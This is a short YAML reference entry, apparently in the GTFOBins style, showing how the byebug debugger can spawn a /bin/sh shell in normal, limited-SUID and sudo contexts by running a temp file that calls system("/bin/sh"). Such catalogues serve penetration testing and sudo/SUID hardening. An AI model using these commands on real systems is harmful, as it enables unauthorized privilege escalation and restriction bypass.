---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo 'system("/bin/sh")' > $TF
        byebug $TF
        continue
  limited-suid:
    - code: |
        TF=$(mktemp)
        echo 'system("/bin/sh")' > $TF
        ./byebug $TF
        continue
  sudo:
    - code: |
        TF=$(mktemp)
        echo 'system("/bin/sh")' > $TF
        sudo byebug $TF
        continue
---
